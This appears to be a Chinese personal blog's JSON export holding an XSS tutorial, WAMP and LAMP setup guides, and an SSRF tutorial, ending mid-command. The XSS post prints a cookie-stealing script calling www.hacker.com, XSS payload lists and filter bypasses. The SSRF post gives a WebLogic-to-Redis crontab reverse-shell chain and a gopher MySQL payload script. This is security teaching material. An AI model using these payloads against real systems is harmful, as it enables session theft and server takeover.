{"meta":{"title":"自留地","subtitle":"","description":"","author":"fkrvro","url":"http://yoursite.com","root":"/"},"pages":[{"title":"标签","date":"2020-02-12T06:32:30.997Z","updated":"2020-02-06T09:45:19.822Z","comments":false,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2020-02-12T06:32:30.997Z","updated":"2020-02-06T09:45:19.822Z","comments":true,"path":"links/index.html","permalink":"http://yoursite.com/links/index.html","excerpt":"","text":""}],"posts":[{"title":"XSS漏洞","slug":"XSS漏洞","date":"2020-02-27T04:41:38.000Z","updated":"2020-02-27T07:45:39.179Z","comments":true,"path":"2020/02/27/XSS漏洞/","link":"","permalink":"http://yoursite.com/2020/02/27/XSS%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"xss的成因 XSS (Cross Site Script)，跨站脚本攻击。它是指恶意攻击者往web页面里插入html代码，当用户浏览该页时，嵌入其中的html代码会被执行，从而达成恶意用户的特殊目的。 XSS危害 XSS攻击的危害包括： 盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力 盗窃企业重要的具有商业价值的资料 非法转账 强制发送电子邮件 网站挂马 控制受害者机器向其它网站发起攻击 XSS攻击类型 XSS可以分为两种类型： 持久型和非持久型 根据数据流向又可以分为三种攻击类型： 反射型XSS攻击(反射型数据流向是：浏览器——&gt;后端——&gt;浏览器) 在反射型 XSS 中，payload 一般存在于网页的 Url中，只用户单击时触发，只执行一次，非持久化，故称反射型 XSS。攻击者发送恶意 Url 链接让受害者点击(一般会对 payload 部分进行处理，如：编码转换和短域名跳转) 存储型XSS攻击(存储型数据流向是：浏览器——&gt;后端——&gt;数据库——&gt;后端——&gt;浏览器) 攻击者将代码通过表单提交的方式，将攻击代码写入数据库，当用户浏览页面的时候，数据库里的信息显示在页面，攻击代码执行，所有浏览到该页面数据的用户都会被XSS攻击 DO2MBasedXSS（基于dom的跨站点脚本攻击）(DOM-XSS 的数据流向是：URL–&gt;浏览器 ,不需要后端服务器的参与) DOM XSS和反射型XSS、存储型XSS的差别在于DOM XSS的代码并不需要服务器参与，触发XSS靠的是浏览器端的DOM解析，完全是客户端的事情。 XSS 的利用方式Cookie 窃取Cookie 是 Web 系统识别用户的身份和保存会话状态的主要机制，且是由服务器生成、存储在客户端的一种数据。同时，对于 cookie 的操作十分的方便，我们可以通过 Document 对象访问 Cookie。如：alert(document.cookie)会弹出当前页面的 cookie 信息。 关于cookie窃取的基础 同源策略，即同端口同域名同协议。同源策略存在的意义就是为了保护用户的信息的安全，除了 cookie 的访问受到同源策略的限制外，还有一些操作也同样受到同源策略的限制： 无法读取非同源网页的 Cookie 、sessionStorage 、localStorage 、IndexedDB 无法读写非同源网页的 DOM 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝响应而报错） Cookie常见属性 Domain————设置关联 Cookie 的域名; Expires————通过给定一个过期时间来创建一个持久化 Cookie; Httponly————用于避免 Cookie 被 Javascript 访问; Name————Cookie 的名称; Path————关联到 Cookie 的路径，默认为 /; Value————读写 Cookie 的值; Secure————用于指定 Cookie 需要通过安全 Socket 层传递连接; Cookie安装类型分类 本地 Cookie————即储存在计算机硬盘中，关闭浏览器后依旧存在 内存 Cookie————即储存在内存中，随浏览器的关闭而消失; 区分方法：只要判断 cookie 中的 expires 即过期时间属性有没有设置，如果设置了即为本地 cookie，反之为内存 cookie。 Cookie 盗取方式 默认情况 默认情况，即不对 Cookie 的任何属性进行指定就设置 Cookie 的情况。这种情况下 Cookie 的获取最为简单。可以通过下列方式获取。 123&lt;script&gt;newImage().src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie;&lt;&#x2F;script&gt; 不同域 这是由于 domain 字段的机制导致的。一个 Cookie 如果不知道 domain 的值，则默认为本域。 例如有两个网站www.a.com和test.a.com且后者存在 xss 漏洞，按照同源策略，这两个网站是不同源的，默认情况下我们无法直接从test.a.com获取到www.a.com的 Cookie，可是如果www.a.com的 Cookie 值中的 domain 属性设置为父级域即a.com，就可以通过test.a.com的 xss 漏洞获取到www.a.com的 Cookie值。 不同路径这是由于 path 字段的机制导致的。在设置 Cookie 时，如果不指定 path 的值，默认就是目标页面的路径。比如在www.a.com/admin/index.php设置 cookie 值且不知道 path，那么 path 默认为/admin/。javascript 可以指定任意路径的 cookie，但是只有对于 path 值的目录下才能读取 Cookie, 即上述例子中只有/admin/目录下的 javascipt 才能读取前边设置的 Cookie。 Http OnlyHttpOnly 是指仅在 Http 层面上传输的 Cookie，当设置了 HttpOnly 标志后，客户端脚本就无法读取该 Cookie，这样做能有效防御 XSS 攻击获取 Cookie，也是目前防御 XSS 的主流手段之一。不过利用某些特定方式也可以同样读取到标志了 HttpOnly 的 Cookie。 利用调试信息，如：PHP 的 phpinfo() 和 Django 的调试信息，里边都记录了 Cookie 的值，且标志了HttpOnly 的 Cookie 也同样可以获取到。 利用 Apache Http Server 400 错误暴露 HttpOnly Cookie 的特点。 SecureSecure 是指设置了 Secure 的 Cookie 尽在 HTTPS 层面上进行安全传输，如果请求是 HTTP 的，则不会带上改 Cookie，这样做的好处是可以降低 Cookie 对中间人攻击获取的风险，可通过默认情况下获取。 P3P HTTP 响应头的 P3P 字段可以用于标识是否允许目标网站的 Cookie 被另一域通过加载目标网站而设置或发送，据说仅 IE 支持（17年）。 我们来举个例子，在 A 域通过 iframe 等方式加载 B 域(此时也称 B 域为第三方域)，如果我们想通过 B 域来设置 A 域的Cookie，或加载 B 域时带上 B 域的 Cookie，这时就得涉及到 P3P。 B 域设置 A 域 Cookie在 IE 下默认是不允许第三方域设置的的，除非 A 域在响应头带上 P3P 字段。当响应头头带上 P3P 后，IE 下第三方域即可进行对 A 域 Cookie 的设置，且设置的 Cookie 会带上 P3P 属性，一次生效，即使之后没有 P3P 头也有效。 加载 B 域时 Cookie 传入问题我们知道 Cookie 分为内存 Cookie 和本地 Cookie，当我们通过 A 域加载 B 域时，默认是带内存 Cookie 加载(如果无内存 Cookie 则不带)，而如果想要带本地 Cookie 加载，则本地 Cookie 必须带 P3P 属性。 会话劫持 由于 Cookie 的不安全性，开发者们开始使用一些更为安全的认证方式——Session。 Session基础： Session 的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的 Session。Session 是给予访问的进程，记录了一个访问的开始到结束，搭档浏览器或进程关闭之后，Session 也就“消失”了。 在 Session 机制中，客户端和服务端也有被其他人利用的可能。 Session 和 Cookie 最大的区别在于：Session 是保存在服务端的内存里面，而 Cookie 保存于浏览器或客户端文件里面 会话劫持的实质就是模拟 GET/POST 请求(带 Cookie)通过受害者浏览器发送给服务器，我们可以通过下面的方式来完成。 我们可以通过构造的 GET/POST 请求来实现如添加管理员、删除文章、上传文件等操作。XSS 蠕虫从某种意义上来说也属于会话劫持。 如： 通过 javascript 控制 DOM 对象来发起一个 GET 请求 123var img&#x3D;document.creatElement(&quot;img&quot;);img.src&#x3D;&quot;http:&#x2F;&#x2F;www.a.com&#x2F;del.php?id&#x3D;1&quot;;document.body.appendChild(img); 通过 javascript 自动构造隐藏表单并提交 (POST) 通过 XMLHttpRequest 直接发送一个 POST 请求 钓鱼 XSS 重定向钓鱼即从www.a.com通过 xss 漏洞跳转到www.b.com的钓鱼页面上，整个过程变化明显，受害者易察觉。 1http:&#x2F;&#x2F;www.a.com&#x2F;index.php?search&#x3D;&lt;script&gt;document.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.b.com&#x2F;index.php&quot;&lt;&#x2F;script&gt; HTML 注入式钓鱼通过 javascript 来修改页面的 DOM 对象属性，或在原页面中添加新的 DOM 元素。前者相对于后者更隐蔽。 Iframe1攻击者通过 javascript 来添加一个新的&lt;Iframe&gt;标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。 XSS 漏洞的挖掘XSS 漏洞的挖掘主要分为白盒审计和黑盒 Fuzz 两种。 白盒审计通过查看源代码来判断网站的交互点是否存在安全过滤。由于此处涉及代码审计。 分析源代码挖掘 XSS 的一般思路是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被 htmlencode() 之类的函数过滤 黑盒 Fuzz进行 XSS 黑盒测试时主要分为手工检测和工具检测。 手工检测首先我们需要尽可能地找到目标的每个输入输出点并挨个尝试；在进行尝试的时候，我们应优先选择特殊字符进行测试，如&quot;&lt;&gt;&amp;;/&#39;:等，如果连&lt;&gt;都未过滤/转义，那么该输入点很可能存在 XSS 漏洞。 如果&lt;&gt;等标记符号都被过滤/转义了，我们也可以使用标签自身的属性/事件(href，lowsrc，bgsound，backgroud，value，action，dynsrc 等)来触发 XSS。 一般来说，针对输入框的黑盒测试可能存在反射型 XSS，也可能存在存储型 XSS，还有可能是 DOM 型，针对 Url 参数的黑盒测试绝大多数只存在反射型 XSS 或 DOM 型 XSS。 &lt;img&gt; 标签： 12345678910111213利用方式1&lt;img src&#x3D;javascript:alert(&quot;xss&quot;)&gt;&lt;IMG SRC&#x3D;javascript:alert(String.formCharCode(88,83,83))&gt;&lt;img scr&#x3D;&quot;URL&quot;style&#x3D;&#39;Xss:expression(alert(&#x2F;xss));&#39;&lt;!--CSS标记xss--&gt;&lt;img STYLE&#x3D;&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;&gt; XSS利用方式2&lt;img src&#x3D;&quot;x&quot;onerror&#x3D;alert(1)&gt;&lt;img src&#x3D;&quot;1&quot;onerror&#x3D;eval(&quot;alert(&#39;xss&#39;)&quot;)&gt; XSS利用方式3&lt;img src&#x3D;1onmouseover&#x3D;alert(&#39;xss&#39;)&gt; &lt;a&gt; 标签： 1234567891011121314151617标准格式&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt;XSS利用方式1&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;aa&lt;&#x2F;a&gt;&lt;a href&#x3D;javascript:eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;javascript:aaa&quot;onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;aa&lt;&#x2F;a&gt;XSS利用方式2&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&lt;a href&#x3D;&quot;&quot;onclick&#x3D;alert(&#39;xss&#39;)&gt;aa&lt;&#x2F;a&gt;利用方式3&lt;a href&#x3D;&quot;&quot;onclick&#x3D;eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;利用方式4&lt;a href&#x3D;kycg.asp?ttt&#x3D;1000onmouseover&#x3D;prompt(&#39;xss&#39;)y&#x3D;2016&gt;aa&lt;&#x2F;a&gt; input 标签: 1234567891011标准格式&lt;input name&#x3D;&quot;name&quot;value&#x3D;&quot;&quot;&gt;利用方式1&lt;input value&#x3D;&quot;&quot;onclick&#x3D;alert(&#39;xss&#39;)type&#x3D;&quot;text&quot;&gt;利用方式2&lt;input name&#x3D;&quot;name&quot;value&#x3D;&quot;&quot;onmouseover&#x3D;prompt(&#39;xss&#39;)bad&#x3D;&quot;&quot;&gt;利用方式4&lt;input name&#x3D;&quot;name&quot;value&#x3D;&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt; form标签: 1234567891011121314XSS利用方式1&lt;form action&#x3D;javascript:alert(&#39;xss&#39;)method&#x3D;&quot;get&quot;&gt;&lt;form action&#x3D;javascript:alert(&#39;xss&#39;)&gt; XSS利用方式2&lt;form method&#x3D;postaction&#x3D;aa.asp?onmouseover&#x3D;prompt(&#39;xss&#39;)&gt;&lt;form method&#x3D;postaction&#x3D;aa.asp?onmouseover&#x3D;alert(&#39;xss&#39;)&gt;&lt;form action&#x3D;1onmouseover&#x3D;alert(&#39;xss&#39;)&gt; XSS利用方式3&lt;!--原code--&gt;&lt;form method&#x3D;postaction&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;form method&#x3D;postaction&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt; iframe标签： 123456789101112131415XSS利用方式1&lt;iframe src&#x3D;javascript:alert(&#39;xss&#39;);height&#x3D;5width&#x3D;1000&#x2F;&gt;&lt;iframe&gt; XSS利用方式2&lt;iframe src&#x3D;&quot;data:text&#x2F;html,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;&lt;!--原code--&gt;&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt; XSS利用方式3&lt;iframe src&#x3D;&quot;aaa&quot;onmouseover&#x3D;alert(&#39;xss&#39;)&#x2F;&gt;&lt;iframe&gt; XSS利用方式3&lt;iframe src&#x3D;&quot;javascript&amp;colon;prompt&amp;lpar;&#96;xss&#96;&amp;rpar;&quot;&gt;&lt;&#x2F;iframe&gt; svg标签 1&lt;svg onload&#x3D;alert(1)&gt; 工具检测关于 XSS 的自动检测软件有许多，如 Burp 的 Scan 模块，BruteXSS: https://github.com/rajeshmajumdar/BruteXSS shellcode 的绕过绕过XSS-FilterXSS-Filter 是一段基于黑名单的过滤函数，大多数 CMS 都有这么个函数，作用于用户的每一个输入点，用于过滤可能的恶意代码。不过从某种意义上来说，基于黑名单的保护是一定不会是安全的，由于 XSS的多变性，几乎不可能存在完全地过滤。 空格回车和 Tab对 XSS-Filter 而言，如果仅仅是将函数加入黑名单处理，那么可以在函数名称之中尝试加入空格、回车、Tab 等键位符来进行绕过。这是由于在 javascript 中只会将;作为语句的终止符，当浏览器引擎解析 javascript 脚本时没有匹配到;便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字javascript|alert的过滤： 123&lt;img src&#x3D;javascript:alert(&#x2F;xss&#x2F;)&gt; 对标签属性值进行转码HTML 中属性值支持 ASCII 码形式，如 1&lt;img src&#x3D;&quot;javascript:alert(&#39;xss&#39;);&quot;&gt; 替换成 1&lt;img src&#x3D;&quot;javascrip&amp;#116&amp;#58alert(&#39;xss&#39;);&quot;&gt; 其中在 ASCII 表中 116 为t，58 为:。 也可以将&amp;#01,&amp;#02等插入 javascript 的头部，还可以将 tab(&amp;#09)|换行符(&amp;#10)|回车键(&amp;#13)插入到代码中的任意位置。 Fuzz 标签未过滤事件名 如&lt;img src=x onerror=alerr(/xss/)&gt;其中的 onerror 即为 IMG 标签的一个事件，通常这样的事件都是以on开头，常见的有: 123456789onResumeonReverseonSeekonSynchRestoredonURLFliponRepeatonPauseonstoponmouseover 使用Css绕过 利用 Css 样式表可以执行 javascript 的特性，如 Css 直接执行 javascript： 1234&lt;div style&#x3D;&quot;background-image:url(javascript:alert(&#39;xss&#39;))&quot;&gt;&lt;style&gt;body&#123;background-image:url(&quot;javascript:alert(&#39;xss&#39;)&quot;);&#125;&lt;&#x2F;style&gt; css 中使用 expression 执行 javascript: 12345&lt;div style&#x3D;&quot;width: expression(alert(&#39;xss&#39;))&quot;&gt;&lt;img src&#x3D;&quot;#&quot;style&#x3D;&quot;xss:expression(alert(&#x2F;xss&#x2F;))&quot;&gt;&lt;style&gt;body&#123;background-image:expression(&quot;alert(&#39;xss&#39;)&quot;);&#125;&lt;&#x2F;style&gt; 在上述的两个例子中，都用到了样式表的 url 属性来执行 XSS 代码。 除了上述两种，还可以利用 @import 直接执行 javascript 代码 123&lt;style&gt;@import&#39;javascript:alert(&quot;xss&quot;)&#39;;&lt;&#x2F;style&gt; 在现实环境下，HTML 页面中的 Css 与 Javascript 的嵌入方式很相似，且 Css 也可以执行 javascript 代码，故我们的 XSS 代码也可以通过嵌入远程恶意 css 文件来进行 XSS 攻击。 扰乱规则1234567891011大小写变换;利用 expression 执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则;结合样式表注释字符 &#x2F;**&#x2F;，通过 css 执行 javascript样式标签会过滤\\和\\0，可以构造如@i\\mp\\0\\0ort &#39;jav\\0asc\\0rip\\t:al\\0er\\t(&quot;x\\0ss&quot;)&#39;绕过Css 关键字进行编码处理，如&lt;p style&#x3D;&quot;xss:\\0065xpression(alert(&#x2F;xss&#x2F;))&quot;&gt;其中 65 为字母 e 进行 unicode 编码后的数字部分利用浏览器解析注释的问题 利用字符编码 javascript 支持许多的编码格式，如： unicode escapes 十六|十|八进制 在IE下甚至支持 JScript Encode 加密后的代码 xss防范： XSS防御的总体思路是：对输入(和URL参数)进行过滤，对输出进行编码。 对输入和URL参数进行过滤(白名单和黑名单) 对输出进行编码 url属性过滤，确保：href 和 src 的值必须以 http://开头，白名单方式；不能有10进制和16进制编码字符。 设置HttpOnly，禁止js脚本读取cookie信息。、","categories":[{"name":"漏洞详解","slug":"漏洞详解","permalink":"http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"WAMP安装","slug":"WAMP安装","date":"2020-02-26T05:58:02.000Z","updated":"2020-02-26T07:15:03.980Z","comments":true,"path":"2020/02/26/WAMP安装/","link":"","permalink":"http://yoursite.com/2020/02/26/WAMP%E5%AE%89%E8%A3%85/","excerpt":"","text":"环境介绍window2012 php-5.6.20-Win32-VC11-x64.zip httpd-2.4.18-x64-vc11-r3.zip vcredist_x64.exe mysql-5.7.11-winx64.zip 安装过程 安装vcredist_x64.exe 解压apache httpd，php，mysql到D:\\wamp 创建默认站点目录D:\\wamp\\www 创建数据库data目录D:\\wamp\\mydata apache httpd设置 添加环境变量 将httpd安装目录下的bin路径添加到Path变量，这里是D:\\wamp\\Apache24\\bin 修改httpd配置文件 D:\\wamp\\Apache24\\conf\\httpd.conf 修改SRVROOT指向到安装目录 1Define SRVROOT &quot;D:&#x2F;wamp&#x2F;Apache24&quot; PHP集成 12345# PHP 5LoadModule php5_module &quot;D:&#x2F;wamp&#x2F;php&#x2F;php5apache2_4.dll&quot;AddType application&#x2F;x-httpd-php .php# configure the path to php.iniPHPIniDir &quot;D:&#x2F;wamp&#x2F;php&quot; 添加index.php为默认文档 1DirectoryIndex index.php index.html 多端口站点配置 添加多端口 12Listen 80Listen 8081 添加多端口站点 123456789101112# Virtual Hosts&lt;VirtualHost *:8081&gt; DocumentRoot &quot;D:&#x2F;wamp&#x2F;www&#x2F;site1&quot; ServerName localhost ErrorLog &quot;logs&#x2F;site1-error.log&quot; CustomLog &quot;logs&#x2F;site1-access.log&quot; common &lt;Directory &quot;D:&#x2F;wamp&#x2F;www&#x2F;site1&quot;&gt; Options FollowSymLinks AllowOverride None Require all granted &lt;&#x2F;Directory&gt;&lt;&#x2F;VirtualHost&gt; 多域名站点配置 添加域名映射到C:\\Windows\\System32\\drivers\\etc\\hosts文件中 1127.0.0.1 site1.example.com 添加多域名站点 1234567891011&lt;VirtualHost *:80&gt; DocumentRoot &quot;D:&#x2F;wamp&#x2F;www&#x2F;site1&quot; ServerName site1.example.com ErrorLog &quot;logs&#x2F;site1-error.log&quot; CustomLog &quot;logs&#x2F;site1-access.log&quot; common &lt;Directory &quot;D:&#x2F;wamp&#x2F;www&#x2F;site1&quot;&gt; Options FollowSymLinks AllowOverride None Require all granted &lt;&#x2F;Directory&gt;&lt;&#x2F;VirtualHost&gt; 创建站点目录D:/wamp/www/site1 创建首页D:/wamp/www/site1/index.php 123&lt;?php phpinfo();?&gt; 把Apache httpd安装成后台服务 1httpd -k install 设置开机自启动ApacheMonitor程序 1将D:&#x2F;wamp&#x2F;Apache24\\bin\\ApacheMonitor.exe拷贝到C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp中 启动apache httpd服务 1httpd -k start php设置 添加环境变量 1将php安装路径添加到Path变量，这里是D:\\wamp\\php 进入PHP安装目录，找到 php.ini-development（生产环境用php.ini-production） 文件并复制一份到当前目录，重命名为 php.ini 修改php配置文件php.ini 1修改ext文件夹的路径（extension_dir&#x3D;&quot;D:&#x2F;wamp&#x2F;php&#x2F;ext&quot;） 要在 php.ini 中启用某扩展库，需要去掉该行 extension=php_\\.dll* 前的注释符号，这里需要启用 php_mbstring，php_openssl 扩展库 开通Windows防火墙1netsh advfirewall firewall add rule name&#x3D;WebServer dir&#x3D;in action&#x3D;allow protocol&#x3D;TCP localport&#x3D;80,443,8080-8090 安装MySQL 进入mysql安装目录，找到 my-default.ini，重命名为 my.ini`` 修改mysql配置文件my.ini 123basedir &#x3D; D:&#x2F;wamp&#x2F;mysqldatadir &#x3D; D:&#x2F;wamp&#x2F;mydataport &#x3D; 3306 打开命令行窗口，执行以下命令来安装并启动mysql 1234cd &#x2F;d D:\\wamp\\mysqlbin\\mysqld --initialize-insecurebin\\mysqld --installNET START MySQL 输入以下命令执行mysql的安全设置 1bin\\mysql_secure_installation 将D:\\wamp\\mysql\\bin添加到PATH环境变量 之后就可以在命令行窗口直接输入以下命令进入mysql控制台 1mysql -u root -p","categories":[{"name":"服务搭建","slug":"服务搭建","permalink":"http://yoursite.com/categories/%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/"}],"tags":[{"name":"http服务","slug":"http服务","permalink":"http://yoursite.com/tags/http%E6%9C%8D%E5%8A%A1/"}]},{"title":"LAMP安装","slug":"LAMP安装","date":"2020-02-26T05:57:56.000Z","updated":"2020-02-27T09:11:57.640Z","comments":true,"path":"2020/02/26/LAMP安装/","link":"","permalink":"http://yoursite.com/2020/02/26/LAMP%E5%AE%89%E8%A3%85/","excerpt":"","text":"centos7安装LAMP 安装apache 1yum -y install httpd 安装apache扩展 1yum -y install httpd-manual mod_ssl mod_perl mod_auth_mysql 启动apache 123systemctl start httpd.service #启动apachesystemctl stop httpd.service #停止systemctl restart httpd.service #重启 设置开机自启动 1systemctl enable httpd.service 安装php 1yum -y install php 安装php-fpm 1yum -y install php-fpm 安装php扩展 1yum -y install php-gd php-xml php-mbstring php-ldap php-pear php-xmlrpc php-devel 安装mysql 1yum -y install mariadb-servie 安装php-mysql 1yum -y install php-mysql 安装mysql扩展 1yum -y install mysql-connector-odbc libdbi-dbd-mysql mysql-devel 启动mysql 123systemctl strat mariadb.service #启动 systemctl stop mariadb.service systemctl restrat mariadb.service 设置开启自启动 1systemctl enable mariadb.service 配置mysql 1mysql_secure_installation","categories":[{"name":"服务搭建","slug":"服务搭建","permalink":"http://yoursite.com/categories/%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/"}],"tags":[{"name":"http服务","slug":"http服务","permalink":"http://yoursite.com/tags/http%E6%9C%8D%E5%8A%A1/"}]},{"title":"SSRF漏洞","slug":"SSRF漏洞","date":"2020-02-26T05:22:09.000Z","updated":"2020-02-26T13:38:44.086Z","comments":true,"path":"2020/02/26/SSRF漏洞/","link":"","permalink":"http://yoursite.com/2020/02/26/SSRF%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"1 SSRF简介SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，攻击的目标是外网无法访问的内部系统，从而突破客户端获取不到数据限制。就是利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。 如： 123GET &#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;google.com&#x2F; HTTP&#x2F;1.1Host: example.com 在这里，http://example.com从它的服务器获取http://google.com SSRF的类型 显示攻击者的响应（Basic） 不显示响应（Blind） 最常用的跳转绕过123456789&lt;?phpheader(&quot;Location: file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)?&gt;&lt;?phpheader(&quot;Location: dict:&#x2F;&#x2F;127.0.0.1:666&#x2F;info&quot;)?&gt;&lt;?phpheader(&quot;Location: gopher:&#x2F;&#x2F;127.0.0.1:666&#x2F;info&quot;)?&gt; SSRF漏洞的危害 对服务器所在的内网进行端口扫描，获取一些服务的banner信息等 攻击运行在内网或者本地的应用程序 对内网WEB应用进行指纹识别，通过访问默认文件实现（Readme等文件） 攻击内外网的WEB应用，主要是GET就可以实现的攻击（比如Struts2，SQL注入等） 下载内网资源（利用file协议读取本地文件等） 利用Redis未授权访问，HTTP CRLF注入达到getshell 进行跳板 无视cdn 漏洞常见出现位置 云服务器商。(各种网站数据库操作) 有远程图片加载的地方。(编辑器之类的有远程图片加载啊) 网站采集、网页抓取的地方。(很多网站会有新闻采集输入url然后一键采集) 头像的地方。(如远程加载头像，例如:http://www.xxxx.com/image?url=http://www.image.com/1.jpg) 要输入网址的地方和可以输入ip的都放，都是ssrf的天下。 SSRF神器Curl的使用查看curl支持的协议列表 #curl–config –protocols 使用curl读取文件 1curl -v file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 使用ftp协议 1curl -v &quot;ftp:&#x2F;&#x2F;127.0.0.1:6666&#x2F;info&quot; 使用dict协议 1curl -v &quot;dict:&#x2F;&#x2F;127.0.0.1:6666&#x2F;info&quot; 使用gopher协议 1curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:6666&#x2F;_info&quot; 实战weblogic ssrf攻击redis Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进一步实现端口探测。该漏洞存在于/uddiexplorer/SearchPublicRegistries.jsp，我们使用burpsuite访问如下url进行测试。 可访问的端口，一般返回error code 访问非http协议，一般返回did not have a valid SOAP content-type 端口关闭，一般返回could not connect over HTTP to server Weblogic SSRF支持通过crlf注入的方式来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。 发送如下3条命令，写入定时任务反弹shell： 1234set 1 &quot;\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.18.0.1&#x2F;21 0&gt;&amp;1\\n\\n\\n\\n&quot;config set dir &#x2F;etc&#x2F;config set dbfilename crontabsave 进行url编码： 1test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa 通过如下链接发送出去，nc监听端口，可成功getshell。 1http:&#x2F;&#x2F;192.168.88.152:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.18.0.3:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa 结合gopher协议实现进一步攻击 SSRF主要是使用get请求，攻击不需要授权的应用，但是如果目标站点支持gopher协议，就可以扩大我们的攻击面。Gopher 协议是 HTTP 协议出现之前，在 Internet 上常用的一个协议，利用此协议可以构造GET、POST 请求，攻击内网中的redis、fastcgi、mysql等。 gopher攻击MySQL MySQL有密码和无密码的认证方式不一样，无密码认证时直接发送TCP/IP数据包即可访问。如果内网中的mysql数据库存在无密码的用户，可结合gopher协议进行攻击。 首先使用tcpdump监听3306端口。 1tcpdump port 3306 -w mysql.pcapng 然后开启MySQL终端，查询一些信息，最后记得exit退出。 1mysql -h192.168.40.155 -uusernopass 使用wireshark打开mysql.pcapng，随便选一个包，追踪TCP流，提取request包的原始数据。 把原始数据保存成一行，然后使用如下脚本进行编码，得到payload。 12345678910#encoding:utf-8def result(s): a&#x3D;[s[i:i+2] for i in xrange(0,len(s),2)] return &quot;curl gopher:&#x2F;&#x2F;192.168.40.155:3306&#x2F;_%&quot; + &quot;%&quot;.join(a)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: import sys s&#x3D;sys.argv[1] print result(s) 1python mysql_gopher.py 4200000185a63f20000000012d0000000000000000000000000000000000000000000000757365726e6f7061737300006d7973716c5f6e61746976655f70617373776f726400210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420310f0000000373686f77206461746162617365730100000001 使用curl命令发送payload，并将输出结果保存成mysql.txt。 1curl 